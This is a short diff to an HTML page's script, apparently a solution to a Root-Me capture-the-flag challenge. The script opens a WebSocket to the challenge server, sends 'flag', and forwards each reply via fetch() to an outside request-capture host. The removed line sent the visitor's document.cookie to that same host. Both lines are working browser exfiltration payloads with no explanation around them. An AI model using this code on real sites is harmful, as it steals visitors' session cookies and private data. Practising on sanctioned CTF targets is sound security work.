@@ -11,10 +11,10 @@
 			console.log("JS is working");
 			var ws = new WebSocket('ws://ctf15.root-me.org/ws');
 			ws.onopen = function (e) {
-				ws.send("READY");
+				ws.send("flag");
 			};
 			ws.onmessage = function (m) {
-				fetch("https.//ooooo.free.beeceptor.com?cookie=" + document.cookie);
+				fetch("https://ooooo.free.beeceptor.com?message=" + m["data"]);
 			};
 		</script>
 	</body>
